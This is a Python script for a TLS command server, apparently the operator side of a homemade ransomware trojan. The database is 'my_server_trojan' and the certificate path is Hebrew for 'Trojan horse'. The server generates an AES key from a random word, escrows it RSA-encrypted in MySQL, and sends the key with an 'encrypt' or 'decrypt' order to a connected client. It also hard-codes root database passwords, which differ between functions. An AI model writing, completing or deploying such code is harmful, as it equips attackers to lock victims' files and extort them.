import os
import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords
import struct


HOST = "0.0.0.0"
PORT = 44444

cert_pem = "C:\\סוס טרויני"
key_pem = "C:\\סוס טרויני"

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=cert_pem, keyfile=key_pem)


# === helpers for message framing ===
def send_msg(sock, data: bytes):
    length = struct.pack("!I", len(data))
    sock.sendall(length)
    sock.sendall(data)

def recvall(sock, n):
    data = b""
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_msg(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack("!I", raw_len)[0]
    return recvall(sock, msg_len)


# === database helpers ===
def mysql_insert_random_word(word):
    sql_conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="saharTheKing!!!",
        database="my_server_trojan"
    )
    cursor = sql_conn.cursor()
    cursor.execute("INSERT INTO random_words (word) VALUES (%s)", (word,))
    sql_conn.commit()
    print(f"the secret word ({word}) has been saved successfully")
    cursor.close()
    sql_conn.close()

def save_encrypted_key_to_db(encrypted_key_b64):
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="saharTheKing!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()
    cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (encrypted_key_b64,))
    conn.commit()
    print("Encrypted AES key has been saved successfully")
    cursor.close()
    conn.close()

def mysql_retrieve_last_word():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="saharTheKing!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()
    cursor.execute("SELECT word FROM random_words ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()
    word = result[0]
    cursor.close()
    conn.close()
    return word

def mysql_retrieve_last_key():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()
    cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()
    key = result[0] if result else None
    cursor.close()
    conn.close()
    return key


# === crypto helpers ===
def generate_aes_key_from_secret(secret_word):
    hasher = SHA256.new()
    hasher.update(secret_word.encode())
    return hasher.digest()

def encrypt_aes_key_with_rsa(aes_key):
    with open("server_RSA_public.pem", "rb") as f:
        public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)
    return base64.b64encode(encrypted_key).decode()

def decrypt_RSA_from_AES_key(encrypted_aes_key):
    with open("server_RSA_private.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    encrypted_aes_key_bytes = base64.b64decode(encrypted_aes_key)
    aes_key = cipher_rsa.decrypt(encrypted_aes_key_bytes)
    return aes_key


# === main server ===
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        with context.wrap_socket(s, server_side=True) as secure_sock:
            conn, address = secure_sock.accept()
            with conn:
                print(f"Got conn from {address}\nThe conn is using TLS")

                # manually toggle
                action = "encrypt"

                if action == "encrypt":
                    r = RandomWords()
                    random_word = r.get_random_word()
                    mysql_insert_random_word(random_word)
                    the_word = mysql_retrieve_last_word()
                    aes_key = generate_aes_key_from_secret(the_word)
                    aes_key_encrypt_by_RSA = encrypt_aes_key_with_rsa(aes_key)
                    save_encrypted_key_to_db(aes_key_encrypt_by_RSA)
                    send_msg(conn, aes_key)

                elif action == "decrypt":
                    encrypt_aes_key_by_rsa = mysql_retrieve_last_key()
                    aes_key = decrypt_RSA_from_AES_key(encrypt_aes_key_by_rsa)
                    send_msg(conn, aes_key)

                # send action
                send_msg(conn, action.encode())

                # receive client answer
                answer = recv_msg(conn).decode()
                print(answer)


if __name__ == "__main__":
    main()